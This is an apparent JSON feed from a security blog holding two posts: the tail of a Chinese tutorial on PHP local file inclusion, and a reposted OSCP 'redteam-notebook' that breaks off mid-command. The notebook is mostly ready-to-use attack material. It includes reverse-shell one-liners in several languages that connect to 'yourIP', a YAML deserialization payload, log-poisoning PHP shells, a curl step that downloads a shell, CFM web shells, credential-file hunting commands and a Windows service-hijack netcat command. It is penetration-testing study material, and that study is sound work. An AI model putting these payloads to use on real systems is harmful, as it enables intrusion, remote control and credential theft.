variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">没有实验完成，先挖个坑。</span></p>\n<h2 id=\"zip伪协议\"><a class=\"anchor\" href=\"#zip伪协议\">#</a> zip:// 伪协议</h2>\n<p>zip 伪协议和 phar 协议类似，但是用法不一样。<br />\n用法：?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php。<br />\n条件： PHP &gt; =5.3.0，注意在 windows 下测试要 5.3.0&lt;PHP&lt;5.4 才可以 #在浏览器中要编码为 %23，否则浏览器默认不会传输特殊字符。</p>\n<p>测试代码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">没有实验完成，先挖个坑。</span></p>\n<h2 id=\"封装协议摘要\"><a class=\"anchor\" href=\"#封装协议摘要\">#</a> 封装协议摘要</h2>\n<table>\n    <tr>\n        <th>属性</th>\n        <th>支持</th>\n    </tr>\n    <tr>\n        <td>受限于 allow_url_include</td>\n        <td>仅 <em>php://input</em>、 <em>php://stdin</em>、 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>允许读取</td>\n        <td>仅 <em>php://stdin</em>、 <em>php://input</em>、 <em>php://fd</em>、 <em>php://memory</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n    <tr>\n        <td>允许写入</td>\n        <td>仅 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、\n            <em>php://memory</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n    <tr>\n        <td>允许追加</td>\n        <td>仅 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://output</em>、 <em>php://fd</em>、\n            <em>php://memory</em> 和 <em>php://temp</em>（等于写入）\n        </td>\n    </tr>\n    <tr>\n        <td>允许同时读写</td>\n        <td>仅 <em>php://fd</em>、 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>支持 stat()</td>\n        <td>仅 <em>php://memory</em> 和 <em>php://temp</em>。</td>\n    </tr>\n    <tr>\n        <td>仅仅支持 stream_select()</td>\n        <td><em>php://stdin</em>、 <em>php://stdout</em>、 <em>php://stderr</em>、 <em>php://fd</em> 和 <em>php://temp</em>。\n        </td>\n    </tr>\n</table>\n<h1 id=\"文件包含姿势\"><a class=\"anchor\" href=\"#文件包含姿势\">#</a> 文件包含姿势</h1>\n<h2 id=\"文件包含session\"><a class=\"anchor\" href=\"#文件包含session\">#</a> 文件包含 session</h2>\n<p><span class=\"label info\">利用条件：</span></p>\n<p>session 的存储位置可以获取。</p>\n<ol>\n<li>通过 phpinfo 的信息可以获取到 session 的存储位置。</li>\n</ol>\n<p>通过 phpinfo 的信息，获取到 session.save_path 为 /var/lib/php5/：</p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<ol start=\"2\">\n<li>另一种只能猜测了<br />\n根据各版本的中间件猜测。</li>\n</ol>\n<p><span class=\"label info\">session 中的内容可以被控制，传入恶意代码。</span></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"><span>示例代码</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token variable\">$s</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'str'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"s\"</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><span class=\"label info\">漏洞分析</span></p>\n<p>此 php 会将获取到的 GET 型 ctfs 变量的值存入到 session 中。</p>\n<p>当访问 http://www.xxx.com/x.php?str=666 后，会在 /var/lib/php5 目录下存储 session 的值。</p>\n<p>session 的文件名为 sess_+sessionid，sessionid 可以通过开发者模式获取。</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>所以 session 的文件名为 sess_88565500f4af7f5e934c59c0ba643a60</p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>到服务器的 /var/lib/php/session 目录下查看果然存在此文件，内容为：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>可以看到 666 已经存里面了</p>\n<p><span class=\"label info\">漏洞利用</span><br />\n通过上面的分析，可以知道 str 传入的值会存储到 session 文件中，如果存在本地文件包含漏洞，就可以通过 str 写入恶意代码到 session 文件中，然后通过文件包含漏洞执行此恶意代码 getshell。</p>\n<p>当访问 http://www.xxx.com/x.php?str=&lt;?php phpinfo ();?&gt; 后，会在 /var/lib/php5 目录下存储 session 的值。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<p><span class=\"label info\">结果</span></p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<h2 id=\"文件包含日志\"><a class=\"anchor\" href=\"#文件包含日志\">#</a> 文件包含日志</h2>\n<p>利用条件：需要知道服务器日志的存储路径，且日志文件可读。</p>\n<p>很多时候，web 服务器会将请求写入到日志文件中，比如说 apache。在用户发起请求时，会将请求写入 access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 /var/log/apache2/。</p>\n<p><span class=\"label danger\">💔必须要更改数据包的访问请求才行，不然在日志文件里会被转码。</span></p>\n<p><span class=\"label info\">示例</span><br />\n<img data-src=\"image014.png\" alt=\"\" /></p>\n<p><span class=\"label success\">✔️还可以在 User-Agent 里插入 payload</span></p>\n<p><img data-src=\"image015.png\" alt=\"\" /></p>\n<p><span class=\"label danger\">💔有的日志文件里不一定会显示 UA 信息</span><br />\n<span class=\"label info\">示例</span><br />\n<img data-src=\"image017.png\" alt=\"\" /><br />\n这是因为 Apache 配置</p>\n<p><img data-src=\"image016.png\" alt=\"\" /></p>\n<p>详情见：<a href=\"https://self-ferry.github.io/2021/01/22/apache%E8%AE%BF%E9%97%AE%E6%97%A5%E5%BF%97%E8%AF%A6%E8%A7%A3%E3%80%90%E8%BD%AC%E3%80%91/\">https://self-ferry.github.io/2021/01/22/apache 访问日志详解【转】/</a></p>\n<h2 id=\"msf-攻击模块\"><a class=\"anchor\" href=\"#msf-攻击模块\">#</a> MSF 攻击模块</h2>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>举个例子</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use exploit/unix/webapp/php_include</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">set</span> rhost <span class=\"token number\">192.168</span>.199.12</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> rport <span class=\"token number\">80</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> phpuri /index.php?file<span class=\"token operator\">=</span>xxLFIxx</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">set</span> path http://192.168.199.147/</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload php/meterpreter/bind_tcp</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin class-name\">set</span> srvport <span class=\"token number\">8888</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>exploit -z</pre></td></tr></table></figure><h1 id=\"常见的敏感信息路径\"><a class=\"anchor\" href=\"#常见的敏感信息路径\">#</a> 常见的敏感信息路径</h1>\n<h2 id=\"windows系统\"><a class=\"anchor\" href=\"#windows系统\">#</a> <span class=\"label info\">Windows 系统</span></h2>\n<p>c:\\boot.ini// 查看系统版本</p>\n<p>c:\\windows\\system32\\inetsrv\\MetaBase.xml// IIS 配置文件</p>\n<p>c:\\windows\\repair\\sam // 存储 Windows 系统初次安装的密码</p>\n<p>c:\\ProgramFiles\\mysql\\my.ini// MySQL 配置</p>\n<p>c:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD// MySQL root 密码</p>\n<p>c:\\windows\\php.ini//php 配置信息</p>\n<h2 id=\"linuxunix系统\"><a class=\"anchor\" href=\"#linuxunix系统\">#</a> <span class=\"label info\">Linux/Unix 系统</span></h2>\n<p>/etc/passwd// 账户信息</p>\n<p>/etc/shadow// 账户密码文件</p>\n<p>/usr/local/app/apache2/conf/httpd.conf// Apache2 默认配置文件</p>\n<p>/usr/local/app/apache2/conf/extra/httpd-vhost.conf// 虚拟网站配置</p>\n<p>/usr/local/app/php5/lib/php.ini// PHP 相关配置</p>\n<p>/etc/httpd/conf/httpd.conf// Apache 配置文件</p>\n<p>/etc/my.conf//mysql 配置文件</p>\n<h2 id=\"日志默认路径\"><a class=\"anchor\" href=\"#日志默认路径\">#</a> <span class=\"label info\">日志默认路径</span></h2>\n<p>apache+Linux 日志默认路径</p>\n<p><code>/etc/httpd/logs/access_log</code></p>\n<p>或者</p>\n<p><code>/var/log/httpd/access log</code></p>\n<p>apache+win2003 日志默认路径</p>\n<p><code>D:/xampp/apache/logs/access.log</code></p>\n<p><code>D:/xampp/apache/logs/error.log</code></p>\n<p>IIS6.0+win2003 默认日志文件</p>\n<p><code>C:/WINDOWS/system32/Logfiles</code></p>\n<p>IIS7.0+win2003 默认日志文件</p>\n<p><code>%SystemDrive%/inetpub/logs/LogFiles</code></p>\n<p>nginx 日志文件在用户安装目录的 logs 目录下</p>\n<p>如安装目录为 /usr/local/nginx, 则日志目录就是在</p>\n<p><code>/usr/local/nginx/logs</code></p>\n<p>也可通过其配置文件 Nginx.conf，获取到日志的存在路径</p>\n<p><code>/opt/nginx/logs/access.log</code></p>\n<p>web 中间件默认配置</p>\n<p>apache+linux 默认配置文件</p>\n<p><code>/etc/httpd/conf/httpd.conf</code></p>\n<p>或者</p>\n<p><code>index.php?page=/etc/init.d/httpd</code></p>\n<p>IIS6.0+win2003 配置文件</p>\n<p><code>C:/Windows/system32/inetsrv/metabase.xml</code></p>\n<p>IIS7.0+WIN 配置文件</p>\n<p><code>C:/Windows/System32/inetsrv/config/application/Host.config</code></p>\n<h1 id=\"文件包含漏洞的防御\"><a class=\"anchor\" href=\"#文件包含漏洞的防御\">#</a> 文件包含漏洞的防御</h1>\n<ol>\n<li>PHP 中使用 open_basedir 配置限制访问在指定的区域</li>\n<li>过滤.（点）/（反斜杠）\\（反斜杠）</li>\n<li>禁止服务器远程文件包含</li>\n</ol>\n<h1 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4MjI4MC5odG1s\">https://www.freebuf.com/articles/web/182280.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLmNuL3RvdXRpYW8tNDE0NzkwLmh0bWw=\">https://www.php.cn/toutiao-414790.html</span><br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25pOWh0bWFyMy9hcnRpY2xlL2RldGFpbHMvNjk4MTIzMDY=\">https://blog.csdn.net/ni9htmar3/article/details/69812306</span></p>\n",
            "tags": [
                "web安全",
                "文件包含"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/01/18/redteam-notebook/",
            "url": "https://self-ferry.github.io/2021/01/18/redteam-notebook/",
            "title": "redteam-notebook【转】",
            "date_published": "2021-01-18T07:58:06.000Z",
            "content_html": "<h1 id=\"redteam-notebook\"><a class=\"anchor\" href=\"#redteam-notebook\">#</a> redteam-notebook</h1>\n<p>Collection of commands, tips and tricks and references I found useful during preparation for OSCP exam.</p>\n<h2 id=\"early-enumeration-generic\"><a class=\"anchor\" href=\"#early-enumeration-generic\">#</a> Early Enumeration - generic</h2>\n<h3 id=\"network-wide-scan-first-steps\"><a class=\"anchor\" href=\"#network-wide-scan-first-steps\">#</a> Network wide scan - first steps</h3>\n<p><code>nmap -sn 10.11.1.0/24</code></p>\n<h3 id=\"netbios-scan\"><a class=\"anchor\" href=\"#netbios-scan\">#</a> netbios scan</h3>\n<p><code>nbtscan -r 10.11.1.0/24</code></p>\n<h3 id=\"dns-recon\"><a class=\"anchor\" href=\"#dns-recon\">#</a> DNS recon</h3>\n<p><code>dnsrecon -r 10.11.1.0/24 -n &lt;DNS IP&gt;</code></p>\n<h3 id=\"scan-specific-target-with-nmap\"><a class=\"anchor\" href=\"#scan-specific-target-with-nmap\">#</a> Scan specific target with nmap</h3>\n<p><code>nmap -sV -sT -p- &lt;target IP&gt; </code></p>\n<h3 id=\"guess-os-using-xprobe2\"><a class=\"anchor\" href=\"#guess-os-using-xprobe2\">#</a> Guess OS using xprobe2</h3>\n<p><code>xprobe2 &lt;target IP&gt;</code></p>\n<h3 id=\"check-netbios-vulns\"><a class=\"anchor\" href=\"#check-netbios-vulns\">#</a> Check Netbios vulns</h3>\n<p><code>nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 target</code></p>\n<h3 id=\"search-for-smb-vulns\"><a class=\"anchor\" href=\"#search-for-smb-vulns\">#</a> Search for SMB vulns</h3>\n<p><code>nmap -p139,445 &lt;target IP&gt; --script smb-vuln*</code></p>\n<h3 id=\"enumerate-using-smb-null-session\"><a class=\"anchor\" href=\"#enumerate-using-smb-null-session\">#</a> Enumerate using SMB (null session)</h3>\n<p><code>enum4linux -a &lt;target IP&gt;</code></p>\n<h3 id=\"enumerate-using-smb-wuser-pass\"><a class=\"anchor\" href=\"#enumerate-using-smb-wuser-pass\">#</a> Enumerate using SMB (w/user &amp; pass)</h3>\n<p><code>enum4linux -a -u &lt;user&gt; -p &lt;passwd&gt; &lt;targetIP&gt;</code></p>\n<h2 id=\"website-enumeration\"><a class=\"anchor\" href=\"#website-enumeration\">#</a> Website Enumeration</h2>\n<h3 id=\"quick-enumeration-using-wordlist\"><a class=\"anchor\" href=\"#quick-enumeration-using-wordlist\">#</a> quick enumeration using wordlist</h3>\n<p><code>gobuster -u http://&lt;target IP&gt; -w /usr/share/dirb/wordlists/big.txt</code></p>\n<h3 id=\"enumeration-and-basic-vuln-scan-of-a-website\"><a class=\"anchor\" href=\"#enumeration-and-basic-vuln-scan-of-a-website\">#</a> enumeration and basic vuln scan of a website</h3>\n<p><code>nikto -host http://&lt;target IP&gt;</code></p>\n<h2 id=\"website-tips-and-tricks\"><a class=\"anchor\" href=\"#website-tips-and-tricks\">#</a> Website tips and tricks</h2>\n<h3 id=\"python\"><a class=\"anchor\" href=\"#python\">#</a> Python</h3>\n<ul>\n<li>Unsafe YAML parsing may allow creation of Python objects and as a result remote code execution</li>\n</ul>\n<pre><code>!!python/object/apply:os.system [&quot;bash -i &gt;&amp; /dev/tcp/yourIP/4444 0&gt;&amp;1&quot;]\n</code></pre>\n<h3 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> PHP</h3>\n<ul>\n<li>Check for LFI</li>\n</ul>\n<p>Add  <code>/etc/passwd%00</code>  to any GET/POST arguments. On windows try  <code>C:\\Windows\\System32\\drivers\\etc\\hosts%00</code>  or  <code>C:\\autoexec.bat%00</code> .<br />\nA quick win could also be any of these files  <code>c:\\sysprep.inf</code> ,  <code>c:\\sysprep\\sysprep.xml</code>  or  <code>c:\\unattend.xml</code>  as they would contain local admin credentials. On linux it's worth checking  <code>/proc/self/environ</code>  to see if there are any credentials passed to the running process via env vars.</p>\n<ul>\n<li>Fetching .php files via LFI</li>\n</ul>\n<p><code>/index.php?somevar=php://filter/read=convert.base64-encode/resource=&lt;file path&gt;%00</code>  this will return base64 encoded PHP file. Good for fishing up  <code>config.php</code>  or similar.</p>\n<ul>\n<li>\n<p>Abusing /proc/self/environ LFI to gain reverse shell<br />\nIn some situations it's possible to abuse  <code>/proc/self/environ</code>  to execute a command. For example:<br />\n <code>index.php?somevar=/proc/self/environ&amp;cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;your IP&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p>\n</li>\n<li>\n<p>Apache access.log + LFI = PHP injection<br />\nIf Apache logs can be accessed via LFI it may be possible to use it to our advantage by injecting any PHP code in it and then viewing it via LFI.</p>\n</li>\n</ul>\n<p>with netcat send a request like this:</p>\n<pre><code>GET /&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;\n\n</code></pre>\n<ul>\n<li>\n<p>auth.log + LFI<br />\n <code>ssh &lt;?php system($_GET[&quot;cmd&quot;]);?&gt;@targetIP</code>  and then LFI  <code>/var/log/auth.log</code></p>\n</li>\n<li>\n<p>/var/mail + LFI<br />\n <code>mail -s &quot;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&quot; someuser@targetIP &lt; /dev/null</code></p>\n</li>\n<li>\n<p>php expect<br />\n <code>index.php?somevar=expect://ls</code></p>\n</li>\n<li>\n<p>php input<br />\n <code>curl -X POST &quot;targetIP/index.php?somevar=php://input&quot; --data '&lt;?php system(&quot;curl -o cmd.php yourIP/cmd.txt&quot;);?&gt;'</code> <br />\nThen access  <code>targetIP/cmd.php</code></p>\n</li>\n</ul>\n<h3 id=\"coldfusion\"><a class=\"anchor\" href=\"#coldfusion\">#</a> ColdFusion</h3>\n<ul>\n<li>\n<p>is it Enterprise or Community?<br />\nCheck how it handles  <code>.jsp</code>  files   <code>curl targetIP/blah/blah.jsp</code> . If 404 - enterprise, 500 - community.</p>\n</li>\n<li>\n<p>which version?<br />\n <code>/CFIDE/adminapi/base.cfc?wsdl</code>  has a useful comment indicating exact version</p>\n</li>\n<li>\n<p>common XEE<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjdXJpdHktYXNzZXNzbWVudC5jb20vZmlsZXMvYWR2aXNvcmllcy8yMDEwLTAyLTIyX011bHRpcGxlX0Fkb2JlX1Byb2R1Y3RzLVhNTF9FeHRlcm5hbF9FbnRpdHlfYW5kX1hNTF9JbmplY3Rpb24ucGRm\">https://www.security-assessment.com/files/advisories/2010-02-22_Multiple_Adobe_Products-XML_External_Entity_and_XML_Injection.pdf</span></p>\n</li>\n<li>\n<p>LFI in admin login locale<br />\n <code>/CFIDE/administrator/enter.cfm?locale=../../../../ColdFusion9\\lib\\password.properties</code>  - may need full path. They can be obtained with help of   <code>/CFIDE/componentutils/cfexplorer.cfc</code></p>\n</li>\n<li>\n<p>Local upload and execution<br />\nOnce access to admin panel is gained it's possible to use the task scheduler to download a file and use a system probe to execute it.</p>\n</li>\n</ul>\n<p><code>Debugging &amp; Logging</code>  -&gt;  <code>Scheduled Tasks</code>  -&gt; url=<path to our executable>, Publish - save output to file (some writable path). Then manually execute this task which will download and save our file.</p>\n<p>To execute it create a probe  <code>Debugging &amp; Logging</code>  -&gt;  <code>System probes</code>  -&gt; URL=<some URL>, Probe fail - fail if probe does not contain &quot;blahblah&quot;, Execute program <path to our downloaded exe>. And then run probe manually.</p>\n<ul>\n<li>\n<p>Files worth grabbing</p>\n<ul>\n<li>CF7 \\lib\\neo-query.xml</li>\n<li>CF8 \\lib\\neo-datasource.xml</li>\n<li>CF9 \\lib\\neo-datasource.xml</li>\n</ul>\n</li>\n<li>\n<p>Simple remote CFM shell</p>\n</li>\n</ul>\n<pre><code>&lt;html&gt;\n&lt;body&gt;\n&lt;cfexecute name = &quot;#URL.runme#&quot; arguments =\n&quot;#URL.args#&quot; timeout = &quot;20&quot;&gt;\n&lt;/cfexecute&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n<ul>\n<li>Simple remote shell using Java (if CFEXECUTE is disabled)</li>\n</ul>\n<pre><code>&lt;cfset runtime = createObject(&quot;java&quot;,\n&quot;java.lang.System&quot;)&gt;\n&lt;cfset props = runtime.getProperties()&gt;\n&lt;cfdump var=&quot;#props#&quot;&gt;\n&lt;cfset env = runtime.getenv()&gt;\n&lt;cfdump var=&quot;#env#&quot;&gt;\n</code></pre>\n<h3 id=\"dir-busting\"><a class=\"anchor\" href=\"#dir-busting\">#</a> dir busting</h3>\n<ul>\n<li>\n<p>generic dirbusting<br />\n <code>gobuster -u targetIP -w /usr/share/dirb/wordlists/big.txt</code></p>\n</li>\n<li>\n<p>fuzz some cgi<br />\n <code>gobuster -u targetIP -w /usr/share/seclists/Discovery/Web_Content/cgis.txt -s 200</code></p>\n</li>\n</ul>\n<h2 id=\"reverse-shell-howto\"><a class=\"anchor\" href=\"#reverse-shell-howto\">#</a> Reverse Shell Howto</h2>\n<ul>\n<li>\n<p>Bash<br />\n <code>bash -i &gt;&amp; /dev/tcp/yourIP/4444 0&gt;&amp;1</code></p>\n</li>\n<li>\n<p>Perl Linux<br />\n <code>perl -e 'use Socket;$i=&quot;yourIP&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;'</code></p>\n</li>\n<li>\n<p>Perl Windows<br />\n <code>perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,&quot;yourIP:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</code></p>\n</li>\n<li>\n<p>Python<br />\n <code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;yourIP&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'</code></p>\n</li>\n<li>\n<p>PHP<br />\n <code>php -r '$sock=fsockopen(&quot;yourIP&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>\n</li>\n<li>\n<p>Ruby<br />\n <code>ruby -rsocket -e'f=TCPSocket.open(&quot;yourIP&quot;,4444).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'</code></p>\n</li>\n<li>\n<p>Java (Linux)</p>\n</li>\n</ul>\n<pre><code>r = Runtime.getRuntime()\np = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/yourIP/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])\np.waitFor()\n</code></pre>\n<ul>\n<li>Groovy</li>\n</ul>\n<pre><code>String host=&quot;localhost&quot;;\nint port=8044;\nString cmd=&quot;cmd.exe&quot;;\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());\nwhile(pe.available()&gt;0)so.write(pe.read());\nwhile(si.available()&gt;0)po.write(si.read());\nso.flush();po.flush();\nThread.sleep(50);\ntry &#123;p.exitValue();\nbreak;\n&#125;catch (Exception e)&#123;&#125;&#125;;\np.destroy();\ns.close();\n\n</code></pre>\n<ul>\n<li>xterm</li>\n</ul>\n<p><code>xterm -display yourIP:1</code></p>\n<p>And on your side authorize the connection with  <code>xhost +targetIp</code>  and catch it with  <code>Xnest :1</code></p>\n<ul>\n<li>socat</li>\n</ul>\n<p>Listener:<br />\n <code>socat file:`tty`,raw,echo=0 yourIP:4444</code></p>\n<p>target:<br />\n <code>socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:yourIP:4444</code></p>\n<h2 id=\"interactive-shell-upgrade-tricks\"><a class=\"anchor\" href=\"#interactive-shell-upgrade-tricks\">#</a> Interactive Shell Upgrade Tricks</h2>\n<ul>\n<li>\n<p>Python (Linux)<br />\n <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' </code></p>\n</li>\n<li>\n<p>Python (Windows)<br />\n <code>c:\\python26\\python.exe -c 'import pty; pty.spawn(&quot;c:\\\\windows\\\\system32\\\\cmd.exe&quot;)' </code></p>\n</li>\n<li>\n<p>Expect</p>\n</li>\n</ul>\n<p>sh.exp</p>\n<pre><code>#!/usr/bin/expect\nspawn sh\ninteract\n</code></pre>\n<ul>\n<li>Script<br />\n <code>script /dev/null</code></li>\n</ul>\n<h2 id=\"inside-windows\"><a class=\"anchor\" href=\"#inside-windows\">#</a> Inside Windows</h2>\n<ul>\n<li>\n<p>Get version<br />\n <code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</code></p>\n</li>\n<li>\n<p>Get users<br />\n <code>net users</code></p>\n</li>\n<li>\n<p>Get user info<br />\n <code>net user &lt;username&gt;</code></p>\n</li>\n<li>\n<p>Check local connections and listening ports (compare with nmap scan to see if there are any hidden ports)<br />\n <code>netstat -ano</code></p>\n</li>\n<li>\n<p>Firewall status<br />\n <code>netsh firewall show state</code> <br />\n <code>netsh firewall show config</code></p>\n</li>\n<li>\n<p>Scheduled tasks<br />\nList -  <code>schtasks /query /fo LIST /v</code> <br />\nCreate -  <code>schtasks /Create /TN mytask /SC MINUTE /MO 1 /TR &quot;mycommands&quot;</code> <br />\nRun -  <code>schtasks /Run /TN mytask</code> <br />\nDelete -  <code>schtasks /Delete /TN mytask</code></p>\n</li>\n<li>\n<p>Running tasks<br />\nList -  <code>tasklist /SVC</code> <br />\nKill -  <code>taskkill /IM &lt;exe name&gt; /F</code> <br />\nKill -  <code>taskkill /PID &lt;pid&gt; /F</code></p>\n</li>\n<li>\n<p>Services<br />\nList -  <code>net start</code> <br />\nLong name to key name  <code>sc getkeyname &quot;long name&quot;</code> <br />\nDetails -  <code>sc qc &lt;key name&gt;</code> <br />\nConfig -  <code>sc config &lt;key name&gt; </code></p>\n</li>\n<li>\n<p>Low hanging fruits to grab</p>\n</li>\n</ul>\n<pre><code>c:\\sysprep.inf\nc:\\sysprep\\sysprep.xml\n%WINDIR%\\Panther\\Unattend\\Unattended.xml\n%WINDIR%\\Panther\\Unattended.xml\n</code></pre>\n<ul>\n<li>\n<p>Installers are running as elevated?<br />\n <code>reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code> <br />\n <code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated</code></p>\n</li>\n<li>\n<p>Find interesting files<br />\n <code>dir /s *pass* == *cred* == *vnc* == *.config*</code> <br />\n <code>findstr /si password *.xml *.ini *.txt</code></p>\n</li>\n<li>\n<p>Find interesting registry entries<br />\n <code>reg query HKLM /f password /t REG_SZ /s</code> <br />\n <code>reg query HKCU /f password /t REG_SZ /s</code></p>\n</li>\n<li>\n<p>Permissions<br />\nCheck detail on service -  <code>accesschk.exe /accepteula -ucqv &lt;service name&gt;</code> <br />\nFind modifiable services -  <code>accesschk.exe /accepteula -uwcqv &quot;Authenticated Users&quot; *</code> <br />\n <code>accesschk.exe /accepteula -uwcqv &quot;Users&quot; *</code> <br />\nFolder permissions -  <code>accesschk.exe -dqv &lt;path&gt;</code> <br />\n <code>cacls &lt;path&gt;</code> <br />\n <code>icacls &lt;path\\file</code></p>\n</li>\n<li>\n<p>Qick win on WinXP SP0/1<br />\n <code>sc config upnphost binpath= &quot;C:\\nc.exe -nv yourIP 4444 -e C:\\WINDOWS\\System32\\cmd.exe&quot;</code> <br />\n <code>sc config upnphost obj= &quot;.\\LocalSystem&quot; password= &quot;&quot;</code> <br />\n <code>sc config upnphost depend= 